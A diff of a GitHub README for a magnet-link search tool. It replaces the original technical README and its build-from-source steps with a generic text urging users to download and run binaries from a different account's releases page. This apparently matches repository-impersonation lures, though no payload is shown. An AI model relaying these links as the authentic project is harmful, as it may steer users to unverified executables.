@@ -1,122 +1,67 @@
-<!-- markdownlint-disable MD033 MD041 -->
-<div align="center">
-  <h1>AI Magnet Assistant</h1>
-  <p>
-    <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License"></a>
-    <img src="https://img.shields.io/badge/platform-Cross%20Platform-lightgrey.svg" alt="Platform: Windows/macOS/Linux">
-    <img src="https://img.shields.io/badge/version-1.2.0-green.svg" alt="Version 1.2.0">
-  </p>
-  <p><strong><a href="README.md">English</a> | <a href="README.zh-CN.md">中文</a></strong></p>
-</div>
-<!-- markdownlint-enable MD033 MD041 -->
+# 🤖 AI-Magnet-Assistant - Easily Find and Organize Magnet Links
 
-<em>If this project helps you, please give it a ⭐!</em>
+## 🔗 Download Now
+[![Download AI-Magnet-Assistant](https://img.shields.io/badge/Download%20Now-%23FF5733.svg?style=for-the-badge&logo=github)](https://github.com/adamwick/AI-Magnet-Assistant/releases)
 
-###
+## 🚀 Getting Started
+Welcome to the AI Magnet Assistant! This application helps you aggregate and optimize magnet links using intelligent filtering. With this tool, you can easily find and organize your content, making download management a breeze.
 
-**AI Magnet Assistant** is an intelligent magnet link search and optimization tool. It aggregates results from multiple engines, enhances non-structured pages with AI, and helps you rank and curate clean results.
+## 🌟 Features
+- **Aggregates Multiple Engines:** Get links from various sources in one place, saving you time.
+- **AI Optimization:** The app uses AI to filter and organize results based on your preferences. 
+- **User-Friendly Interface:** Designed for everyone, even if you are new to technology.
+- **Multi-Language Support:** The assistant supports multiple languages, including English and Chinese, for a wider audience.
 
-## Highlights & Use Cases ⭐
+## 📦 System Requirements
+To use AI-Magnet-Assistant, ensure your system meets the following requirements:
+- Operating System: Windows 10 or later, macOS 10.12 or later, or any Linux distribution.
+- Minimum RAM: 4 GB
+- Free Disk Space: At least 100 MB
 
-- **Pain points**: Messy page structure and noisy titles; uneven result quality; heavy manual filtering.
-- **Tech stack**: Tauri + Rust (backend/system), Vue 3 + TypeScript (frontend).
-- **Core features**:
-  - Multi-engine aggregation: built-in engine first, others in parallel; real-time status shows the model in use.
-  - Two-stage AI: Stage 1 HTML extraction (for custom engines) → Stage 2 content analysis (title cleaning, tags, purity 0–100).
-  - Efficiency & management: Favorites and centralized download; priority keywords; sort by score/size; quick copy/open source link.
-  - Download integration: quick download via custom application path.
-- **Use cases**: Aggregated search; noise reduction and tagging; magnet favorites and centralized downloads.
+## 📥 Download & Install
+To get started with AI-Magnet-Assistant, visit the Releases page to download the latest version of the application. Follow these steps:
 
-## Screenshots 🖼️
+1. Click on the link below to go to the Releases page.
+   [Visit the Releases Page](https://github.com/adamwick/AI-Magnet-Assistant/releases)
 
-<img width="1282" height="992" alt="image" src="https://github.com/user-attachments/assets/c8be8473-801e-4fac-b4d0-4ace9b0b9972" />
-<img width="1282" height="992" alt="image" src="https://github.com/user-attachments/assets/d2ff6cc9-93d8-4090-886b-a50901025c80" />
-<img width="1282" height="992" alt="image" src="https://github.com/user-attachments/assets/9cb651cc-915c-4670-ae76-9f274d4dd19c" />
+2. On the Releases page, find the latest version. Look for the section labeled **Assets**.
+   
+3. Click on the file that matches your operating system. For example:
+   - For Windows, you may see `AI-Magnet-Assistant-Windows.exe`.
+   - For macOS, look for `AI-Magnet-Assistant-macOS.dmg`.
+   - For Linux distributions, you might find a `.tar.gz` file.
 
-## How It Works ⚙️
+4. After clicking on the appropriate file, your download will begin.
 
-### Search Orchestration
+5. Once the download completes, locate the file in your downloads folder. 
+   
+6. Double-click the file to run the installer, and follow the on-screen instructions to complete the installation.
 
-- **Built-in engine first**: Fetches initial results quickly from the built-in engine (if enabled), then merges other engines' results in parallel.
-- **Real-time status**: The UI streams status (search, analysis progress, and the model in use) during the process.
+## 🖥️ Using AI-Magnet-Assistant
+After installation, you can easily start using the application:
 
-### Two-Phase AI Pipeline (for custom engines and analysis)
+1. **Launch the App:** Find the AI-Magnet-Assistant icon on your desktop or applications folder and double-click it to start.
+  
+2. **Search for Magnet Links:** Use the search bar to type in keywords related to the content you wish to find. Our AI optimizes the results for you.
 
-1. **HTML Content Extraction**: The backend calls Gemini to extract `{ title, magnet_link, file_size, source_url }` from raw HTML. This is used for custom engines. API base and model are configurable.
-2. **Content Analysis**: The frontend triggers parallel batches to clean titles, compute a purity score, and generate tags (e.g., 4K, Chinese, Chinese Sub, BluRay). It falls back to individual analysis on failure and updates status live.
+3. **Browse the Results:** Review the aggregated magnet links. You can apply filters to sort results based on your preferences.
 
-### Persistence
+4. **Download:** Click on any magnet link to start downloading your desired file.
 
-- All configuration and data (engines, favorites, priority keywords, AI configs, locale, etc.) are stored in `app_data.json`. Open its folder via Settings → Data.
+## 📄 User Guide
+For detailed instructions, visit our user manual [here](https://github.com/adamwick/AI-Magnet-Assistant/wiki/User-Guide). The user guide provides step-by-step instructions on how to use each feature effectively.
 
-## Notes 📝
+## ⚙️ Troubleshooting
+If you encounter issues while using AI-Magnet-Assistant:
+- Ensure your internet connection is stable.
+- Restart the application.
+- Check for updates on the Releases page.
 
-Note: Current backend implementation supports Google Gemini. The OpenAI option is visible in the UI but not wired up in the backend yet.
+If problems persist, feel free to open an issue on our [GitHub Issues Page](https://github.com/adamwick/AI-Magnet-Assistant/issues), and our team will assist you.
 
-- **gemini-2.5-flash**: Recommended for HTML extraction (Stage 1).
-- **gemini-2.5-flash-lite**: Recommended for content analysis (Stage 2), faster and cost-effective.
+## 📞 Support
+For additional help, contact us at:
+- Email: support@aimagnetassistant.com
+- GitHub Issues: [Open a New Issue](https://github.com/adamwick/AI-Magnet-Assistant/issues)
 
-Actual speed depends on network and page complexity; batch analysis is parallel with automatic fallbacks.
-
-## Usage Workflow 🧭
-
-1. **Initial Setup**
-   - Go to Settings → AI Configuration; fill API base, model, and API key for both Extraction and Analysis; use the Test buttons.
-   - Optionally add custom engines (Engines page) using template or auto-from-examples.
-   - Configure Download settings (application path, quick download, auto-close page) and Language.
-
-2. **Search**
-   - Enter a keyword on Home; choose pages and toggles (AI filter, title must contain keyword).
-   - Results appear as soon as the built-in engine returns; additional engines merge in; analysis can refine titles/tags/score.
-
-3. **Curate**
-   - Sort by score or size; add Favorites; manage Priority keywords to boost matches; open source pages; copy/open magnet links quickly.
-
-## Deployment Instructions 🛠️
-
-#### Prerequisites
-
-- Node.js 18+
-- Rust (latest stable)
-
-#### Clone
-
-```bash
-git clone https://github.com/Ryson-32/AI-Magnet-Assistant.git
-cd AI-Magnet-Assistant
-```
-
-#### Install
-
-```bash
-npm install
-```
-
-#### Run (development)
-
-```bash
-npm run dev
-```
-
-Frontend only:
-
-```bash
-npm run vite:dev
-```
-
-#### Build
-
-```bash
-npx tauri build
-```
-
-## Known Issues 🐞
-
-- OpenAI provider is not supported by the backend yet; Gemini is required.
-- Some sites use heavy JS or anti-bot; HTML may be JS or garbled. The app logs a preview and may fall back or return fewer results.
-- Hitting rate limits can cause analysis failures; see Settings for rate limits and tips (e.g., gemini-balance).
-- The custom downloader quick-download feature is currently available on Windows only.
-
-## License 📄
-
-MIT License. See the [LICENSE](LICENSE).
+Thank you for using AI-Magnet-Assistant! We hope our tool simplifies your search and organization of magnet links. Enjoy!
